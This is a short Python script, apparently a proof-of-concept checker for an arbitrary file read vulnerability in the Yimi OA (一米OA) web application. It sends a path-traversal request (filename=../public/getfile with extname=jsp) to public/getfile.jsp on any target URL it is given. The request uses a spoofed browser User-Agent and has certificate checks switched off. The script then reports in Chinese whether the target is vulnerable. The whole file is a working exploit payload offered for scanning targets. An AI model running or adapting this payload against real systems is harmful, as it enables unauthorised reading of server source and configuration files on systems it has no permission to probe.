import time

import requests


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


# proxies={'http':'http://127.0.0.1:8080'}

def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    }
    plani_url = target_url + 'public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp '
    print(now_time() + " [INFO]     正在检测{}一米OA getfile.jsp 任意文件读取漏洞漏洞".format(target_url))
    try:
        requests.packages.urllib3.disable_warnings()
        respones1 = requests.get(plani_url, headers=headers, verify=False)
        if respones1.status_code == 200:
            print(now_time() + ' [SUCCESS]  一米OA getfile.jsp 任意文件读取漏洞存在{}'.format(plani_url))
        else:
            print(now_time() + ' [WARNING]  一米OA getfile.jsp 任意文件读取漏洞不存在')
    except:
        print(now_time() + ' [WARNING]  一米OA getfile.jsp 任意文件读取漏洞不存在')
